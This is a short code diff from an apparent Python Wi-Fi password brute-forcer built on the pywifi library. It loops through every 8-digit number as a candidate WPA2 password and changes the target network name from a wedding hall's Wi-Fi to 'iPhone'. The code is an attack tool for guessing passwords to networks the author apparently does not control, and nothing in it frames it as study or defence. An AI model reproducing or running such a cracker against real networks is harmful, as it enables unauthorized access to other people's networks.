@@ -7,7 +7,7 @@ for i in range(100000000):
     pwd=str(i).zfill(8)
     print(pwd)
     profile = pywifi.Profile()
-    profile.ssid ='婚礼第一大厅' #wifi名称 
+    profile.ssid ='iPhone' #wifi名称 
     profile.auth = const.AUTH_ALG_OPEN #验证方式
     profile.akm.append(const.AKM_TYPE_WPA2PSK) #加密方式
     profile.cipher = const.CIPHER_TYPE_CCMP    #加密类型
